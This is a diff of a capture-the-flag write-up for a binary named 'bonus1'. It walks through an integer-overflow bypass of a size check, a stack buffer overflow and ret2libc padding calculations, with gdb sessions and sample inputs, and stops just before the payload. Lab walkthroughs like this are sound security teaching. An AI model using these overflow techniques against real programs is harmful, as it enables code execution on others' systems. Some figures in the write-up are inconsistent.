@@ -32,7 +32,7 @@ int main(int argc, char **argv)
 Let's focus on the `main` function. It reads input from the command line and then `atoi` converts it to an integer. If the integer is greater than 9, the program exits. Otherwise, it copies the second argument to the `buf` buffer using `memcpy` with a size of `ret << 2` (equivalent to `ret * 4`).  
 If we successfully bypass the `ret > 9` check, we can overflow the buffer, which would allow us to write over `ret` and potentially reach the `execl` call or over the return address.
 
-Let's use the following `C` program to figure out a way to bypass the `ret > 9` check:
+Let's use the following C program to figure out a way to bypass the `ret > 9` check:
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -83,7 +83,8 @@ atoi(0xbffff902, 0x8049764, 3, 0x80482fd, 0xb7fd13e4) = 0x8000000b
 memcpy(0xbffff704, "TEST", 44) = 0xbffff704
 ```
 
-As we can see, `atoi` returns `0x8000000b` which is `11` in decimal (if we ignore the 8). Furthermore, `memcpy` copies `44` bytes to the buffer, which means we can write over `ret`.
+As we can see, `atoi` returns `0x8000000b` which is 11 in decimal (if we ignore the 8). Furthermore, `memcpy` copies 44 bytes to the buffer, which means we can write over `ret`.
+> We can also provide more bytes than is allocated for the stack, which would allow us to write over the return address. We'll see this in the ret2libc section.
 
 There's different ways to solve this challenge, we'll see two of them. First the intended way with writing over the int and then the ret2libc way.
 
@@ -95,7 +96,7 @@ number + padding + value of ret
 -2147483637 + 40 * A + 0x574f4c46
 ```
 
-Indeed since `-2147483638` allows us to write `44` bytes to the buffer, we can write `40` bytes of padding and then the value of `ret` so that the `if` condition is satisfied.
+Indeed since `-2147483638` allows us to write 44 bytes to the buffer, we can write 40 bytes of padding and then the value of `ret` so that the `if` condition is satisfied.
 
 Let's try it:
 ```bash
@@ -132,16 +133,39 @@ Start Addr   End Addr       Size     Offset objfile
 1 pattern found.
 ```
 
-To find our padding, we'll use a [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/):
+To find our padding, Let's analyze the stack layout of our program:
 ```bash
-(gdb) r -2147483615 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 
-Starting program: /home/user/bonus1/bonus1 -2147483615 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+(gdb) b *main+127 # Breaking before leave
+Breakpoint 1 at 0x80484a3
 
-Program received signal SIGSEGV, Segmentation fault.
-0x39624138 in ?? ()
+(gdb) r 42 # Run the program
+Starting program: /home/user/bonus1/bonus1 42
+
+Breakpoint 1, 0x080484a3 in main ()
+
+(gdb) info registers # Check esp and ebp addresses
+[...]
+esp            0xbffff6e0       0xbffff6e0
+ebp            0xbffff728       0xbffff728
+[...]
 ```
 
-Therefore we need 56 bytes of padding.
+By calculating the difference between `esp` and `ebp` we can see that the stack is allocated 72 bytes:
+```
+0xbffff728 - 0xbffff6e0 = 48 (72 in decimal)
+```	
+
+Furthermore, we can see that our buffer is located at `0x14(%esp),%eax`. Since there is 72 bytes for the stack, our buffer will therefore requiere 52 bytes (72 - 20) before reaching `ebp`.
+
+Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 4 bytes to go from `ebp` to `ebp + 4` (the return address). So a total of 56 bytes (52 + 4).
+
+Anything written beyond those 56 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.
+
+With our padding sorted out, we need a number that will allow us to write 56 bytes to reach the return address and then the addresses of the `system`, `exit` functions and the string `/bin/sh` in memory. So a total of 68 bytes (56 + 4 + 4 + 4):
+```bash
+❯ ./a.out -2147483631
+-8589934524 vs 68
+```
 
 Alright, let's craft our payload:
 ```
